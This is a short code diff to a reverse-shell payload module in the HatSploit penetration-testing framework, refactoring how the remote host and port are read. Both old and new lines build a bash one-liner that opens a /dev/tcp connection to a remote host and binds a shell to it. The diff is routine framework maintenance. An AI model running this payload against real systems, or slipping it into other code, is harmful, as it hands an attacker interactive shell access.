@@ -5,7 +5,7 @@ Current source: https://github.com/EntySec/HatSploit
 
 import random
 
-from hatsploit.lib.payload import Payload
+from hatsploit.lib.payload.basic import *
 
 
 class HatSploitPayload(Payload):
@@ -26,10 +26,7 @@ class HatSploitPayload(Payload):
         }
 
     def run(self):
-        remote_host = self.handler['RHOST']
-        remote_port = self.handler['RPORT']
-
         fd = random.randint(0, 200)
-        payload = f"bash -c '0<&{fd}-;exec {fd}<>/dev/tcp/{remote_host}/{remote_port};sh <&{fd} >&{fd} 2>&{fd}' &"
+        payload = f"bash -c '0<&{fd}-;exec {fd}<>/dev/tcp/{self.rhost.value}/{self.rport.value};sh <&{fd} >&{fd} 2>&{fd}' &"
 
         return payload
